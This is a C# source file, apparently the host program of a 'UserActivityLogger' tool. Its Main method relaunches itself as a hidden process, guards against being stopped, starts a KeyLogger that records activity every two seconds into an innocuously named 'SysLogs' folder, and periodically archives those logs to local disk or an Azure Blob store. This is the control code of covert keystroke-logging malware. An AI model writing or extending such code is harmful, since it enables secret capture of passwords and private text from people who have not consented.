﻿using Core;
using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using UserActivityLogger;


namespace Host
{
    class Program
    {
        static string _localLogFolder;
        static string _archiveLocation;
        static void Main(string[] args)
        {
            if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost"))
            {
                return;
            }


            if (args.Length > 0 && args[0] == "hidden")
            {
                _localLogFolder = Path.Combine(GetRootFolderPath(), "SysLogs");

                new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);

                new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_localLogFolder, TimeSpan.FromMinutes(5));

                //new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromSeconds(5));

                var activityLogger = new StartUp(TimeSpan.FromSeconds(2), _localLogFolder, new KeyLogger());

                ProcessHelper.Watch();

                activityLogger.Start();
            }
            else
            {
         
                ProcessHelper.RunHidden(System.Reflection.Assembly.GetEntryAssembly().Location);
            }
        }


        static string GetRootFolderPath()
        {
            try
            {
                if (ConfigurationManager.AppSettings["DemoFolder"] != null)
                {
                    var rootFolder = ConfigurationManager.AppSettings["DemoFolder"].Trim();
                    if (!string.IsNullOrEmpty(rootFolder))
                    {
                        if (!Directory.Exists(rootFolder))
                        {
                            Directory.CreateDirectory(rootFolder);
                        }

                        return rootFolder;
                    }
                }
            }
            catch (Exception ex)
            {

            }

            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

        private static IFileSystem GetFileSystem()
        {
            var configuredFileSystem = ConfigurationManager.AppSettings["FileSystem"];
            if (string.IsNullOrEmpty(configuredFileSystem))
            {
                return new NtfsFileSystem();
            }


            switch (configuredFileSystem.ToUpperInvariant())
            {
                case "NTFS":
                    _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_NTFS"];
                    return new NtfsFileSystem();
                    break;
                case "AZUREBLOB":
                    _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_AZUREBLOB"];
                    return new AzureBlobFileSystem(ConfigurationManager.AppSettings["StorageConnectionString"]);
                    break;
            }

            return new NtfsFileSystem();
        }
    }
}
